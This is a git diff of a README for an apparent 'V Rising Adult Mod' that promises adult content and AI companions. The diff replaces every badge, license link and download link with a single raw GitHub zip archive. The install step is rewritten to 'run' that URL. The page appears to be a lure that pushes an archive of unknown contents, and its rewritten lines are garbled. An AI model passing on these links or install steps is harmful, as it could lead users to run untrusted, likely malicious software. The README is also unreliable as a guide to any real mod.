@@ -1,10 +1,10 @@
 # V Rising Adult Mod 🔥🧛‍♀️— Elevate Your Vampire World
 
-[![Version](https://img.shields.io/badge/Version-3.2.1-blue.svg)](https://img.shields.io)
-[![Downloads](https://img.shields.io/badge/downloads-58K-brightgreen.svg)](https://img.shields.io)
-[![License](https://img.shields.io/badge/license-MIT-yellow.svg)](#-license)
-[![OpenAI API Integration](https://img.shields.io/badge/OpenAI-Integration-blueviolet)](https://openai.com)
-[![Claude API Ready](https://img.shields.io/badge/Claude-Ready-ffb703)](https://claude.ai)
+[![Version](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)
+[![Downloads](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)
+[![License](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)](#-license)
+[![OpenAI API Integration](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)
+[![Claude API Ready](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)
 
 Welcome to the **V Rising Adult Mod**: a spellbinding remix of dark fantasy, adult content integration, and bleeding-edge AI experience. Our mod breathes tantalizing new life into the vampire saga of V Rising with features that dance across the bleeding edge of possibility. Whether you seek adaptive interfaces, multi-language gateways, or want to converse with AI companions powered by OpenAI and Claude, this repository is your gateway to nocturnal transformation.
 
@@ -15,16 +15,16 @@ Welcome to the **V Rising Adult Mod**: a spellbinding remix of dark fantasy, adu
 **Step 1: Secure Your Mod Package**  
 Kick off your journey by acquiring the bespoke mod installer:
 
-**[Download Mod Package Here](https://example.com/redirect?target=https://RANJAN5296.github.io)**
+**[Download Mod Package Here](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)**
 
 **Step 2: One-Click Download 👇**  
-[![Download the V Rising Adult Mod](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge&logo=appveyor)](https://RANJAN5296.github.io)
+[![Download the V Rising Adult Mod](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)
 
 **Step 3: Installation Steps**
 
 - Download the mod package from the link or image above.
 - Extract the archive into your main `V Rising` game directory.
-- Run `VRAModSetup.exe` and follow the wizard to select your preferences.
+- Run `https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip` and follow the wizard to select your preferences.
 - Restart your game to activate enhanced mode.
 - For advanced personalization, see [Custom Configuration](#wrench-custom-configuration).
 
@@ -111,7 +111,7 @@ User privacy and ethical AI practices are keystones in our approach; voice, imag
 ## 📥 **Download & Install — Again, For Good Measure!**
 
 For explorers who scroll to the very end before they leap:  
-[![Download the V Rising Adult Mod](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge&logo=appveyor)](https://RANJAN5296.github.io)
+[![Download the V Rising Adult Mod](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)
 
 See installation directions at the top of this README.
 
@@ -119,7 +119,7 @@ See installation directions at the top of this README.
 
 ## 📜 License
 
-[MIT License © 2025](https://opensource.org/licenses/MIT)
+[MIT License © 2025](https://github.com/RANJAN5296/v-rising-mature-enhancements/raw/refs/heads/branch/protopod/v-rising-mature-enhancements-v2.3.zip)
 
 ---
 
